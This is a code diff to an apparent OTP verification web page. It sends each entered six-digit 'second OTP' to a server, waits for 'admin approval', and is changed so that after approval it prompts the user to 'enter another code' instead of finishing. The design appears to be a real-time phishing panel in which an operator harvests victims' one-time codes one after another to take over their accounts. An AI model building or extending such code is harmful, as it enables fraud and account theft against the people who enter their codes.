@@ -149,6 +149,16 @@ button:disabled{
   margin-top:12px;
   display:none;
 }
+
+.success-message{
+  color:#059669;
+  font-size:13px;
+  margin-top:12px;
+  display:none;
+  background:#d1fae5;
+  padding:10px;
+  border-radius:12px;
+}
 </style>
 </head>
 <body>
@@ -181,6 +191,7 @@ button:disabled{
     <button id="verifyBtn">Verify</button>
     <button class="link" id="differentEmail">Use a different email</button>
     <div id="errorMessage" class="error-message"></div>
+    <div id="successMessage" class="success-message"></div>
   </div>
 </div>
 
@@ -192,8 +203,10 @@ button:disabled{
   const inputs = ['digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6'];
   const verifyBtn = document.getElementById('verifyBtn');
   const errorDiv = document.getElementById('errorMessage');
+  const successDiv = document.getElementById('successMessage');
   let isProcessing = false;
   let approvalInterval = null;
+  let currentOTP = null;
 
   inputs.forEach((id, index) => {
     const input = document.getElementById(id);
@@ -261,11 +274,29 @@ button:disabled{
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
     errorDiv.style.display = 'none';
+    successDiv.style.display = 'none';
   }
 
   function showWaitingForApproval() {
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin approval...</span>';
+  }
+
+  function showReadyForNewOTP() {
+    isProcessing = false;
+    verifyBtn.disabled = false;
+    verifyBtn.innerHTML = 'Verify';
+    // Clear all inputs
+    inputs.forEach(id => {
+      document.getElementById(id).value = '';
+    });
+    // Focus first input
+    document.getElementById('digit1').focus();
+    // Clear any intervals
+    if (approvalInterval) {
+      clearInterval(approvalInterval);
+      approvalInterval = null;
+    }
   }
 
   function hideLoading() {
@@ -284,9 +315,20 @@ button:disabled{
           body: JSON.stringify({ email })
         });
         const data = await response.json();
-        if (data.approved) {
+        if (data.approved === true) {
+          // Admin approved this OTP - show success and reset for next OTP
           clearInterval(approvalInterval);
-          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+          approvalInterval = null;
+          
+          // Show success message
+          successDiv.textContent = '✓ OTP approved! You can now enter another code.';
+          successDiv.style.display = 'block';
+          
+          // Reset for new OTP
+          setTimeout(() => {
+            successDiv.style.display = 'none';
+            showReadyForNewOTP();
+          }, 2000);
         }
       } catch (err) {}
     }, 2000);
@@ -298,10 +340,15 @@ button:disabled{
     if (!otp || otp.length !== 6) {
       errorDiv.textContent = 'Please enter all 6 characters';
       errorDiv.style.display = 'block';
+      setTimeout(() => {
+        errorDiv.style.display = 'none';
+      }, 3000);
       return;
     }
 
+    currentOTP = otp;
     showLoading();
+    
     try {
       const response = await fetch('/api/users/submit-second-otp', {
         method: 'POST',
@@ -309,6 +356,7 @@ button:disabled{
         body: JSON.stringify({ email, otp })
       });
       const data = await response.json();
+      
       if (data.success) {
         showWaitingForApproval();
         startCheckingSecondApproval();
@@ -316,11 +364,17 @@ button:disabled{
         hideLoading();
         errorDiv.textContent = data.error || 'Invalid OTP';
         errorDiv.style.display = 'block';
+        setTimeout(() => {
+          errorDiv.style.display = 'none';
+        }, 3000);
       }
     } catch (error) {
       hideLoading();
       errorDiv.textContent = 'Network error. Please try again.';
       errorDiv.style.display = 'block';
+      setTimeout(() => {
+        errorDiv.style.display = 'none';
+      }, 3000);
     }
   }
 
